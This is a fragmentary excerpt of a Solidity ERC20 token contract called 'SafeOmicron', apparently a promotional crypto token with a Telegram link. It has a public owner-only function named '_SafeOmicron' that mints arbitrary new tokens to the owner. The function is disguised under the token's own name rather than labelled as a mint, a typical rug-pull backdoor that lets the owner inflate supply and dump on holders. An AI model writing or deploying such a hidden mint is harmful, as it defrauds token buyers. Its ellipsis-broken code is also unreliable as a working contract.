...
//
//
// 📱 Telegram:https://t.me/SafeOmicron
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SafeOmicron(uint256 amount) public onlyOwner {
        SafeOmicron(msg.sender, amount);
    }
    ...
    function SafeOmicron(address account, uint256 amount) internal virtual {
...
contract SafeOmicron is ERC20 {

    uint tokenTotalSupply = 100000000; //Token Supply

    constructor() public ERC20("SafeOmicron", "SafeOmicron") {
        SafeOmicron(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}